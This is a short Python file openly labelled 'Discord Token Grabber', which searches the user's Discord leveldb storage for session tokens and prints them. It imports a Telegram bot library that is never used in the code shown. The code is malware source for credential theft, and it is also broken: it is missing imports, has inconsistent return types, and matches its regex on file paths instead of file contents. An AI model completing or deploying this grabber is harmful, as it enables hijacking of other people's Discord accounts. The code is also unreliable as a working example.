from telegram.ext import Updater, CommandHandler

# Author    : NYAN CAT
# Name      : Discord Token Grabber
# Contact   : <https://github.com/NYAN-x-CAT>

class DiscordGrabber:

    def get(self):
        ldb_files = self.search_for_file()
        if not ldb_files:
            return "⛔ Didn't find any ldb files"
        for token in ldb_files:
            for match in re.finditer(r'[^\"]*', token):
                if match.group(0).strip() == '':
                    continue
                if match.group(0).strip().startswith('"'):
                    continue
                if match.group(0).strip().endswith('"'):
                    continue
                if len(match.group(0).strip()) == 59:
                    print(f"💎 Discord token: {match.group(0).strip()}")

    def search_for_file(self):
        discord_path = os.path.join(os.path.join(os.path.expanduser("~") + "\\appdata\\local\\discord\\Local Storage\\leveldb\\"))
        if not os.path.exists(discord_path):
            return "🛠 Discord path not found"
        ldb_files = []
        for file in os.listdir(discord_path):
            if file.endswith(".ldb"):
                file_path = os.path.join(discord_path, file)
                if os.path.exists(file_path):
                    with open(file_path, 'r', encoding='utf-8') as f:
                        raw_text = f.read()
                        if raw_text.lower().find("oken")!= -1:
                            ldb_files.append(file_path)
        return ldb_files

